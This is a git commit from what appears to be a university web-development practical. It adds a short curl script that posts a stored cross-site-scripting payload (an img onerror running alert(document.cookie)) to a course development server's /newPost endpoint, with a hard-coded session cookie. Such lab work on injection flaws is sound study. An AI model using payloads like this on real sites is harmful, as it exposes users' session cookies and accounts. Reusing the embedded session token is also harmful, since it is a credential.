db28748d582f278059160820939db4a6f27e5e83
a1766661 <a1766661@535180cf-fdf8-4563-973f-9dc578d4b257>
2020-06-07 07:41:18 +0000

    prac10

---
+++ 2020/s1/wdc/prac10/public/task1-1.sh
@@ -0,0 +1,8 @@
+curl --request POST \
+  --url https://19e9b6c3-0dbf-4032-8599-015610d884f7-ide.cs50.xyz/newPost \
+  --header 'content-type: application/json' \
+  --cookie connect.sid=s%253APyd-lOqGhpD8pHvB80-l1jAzN_YbIuJP.2sGj3NTqEFJi4cLvzADX5GYhW2Ta9EAtqLEhMf8l60s \
+  --data '{
+	"title":" <img src = '\''lol'\'' onerror = '\''alert(document.cookie)'\'' />",
+	"body":"webpage hacked unfortunately!"
+}'
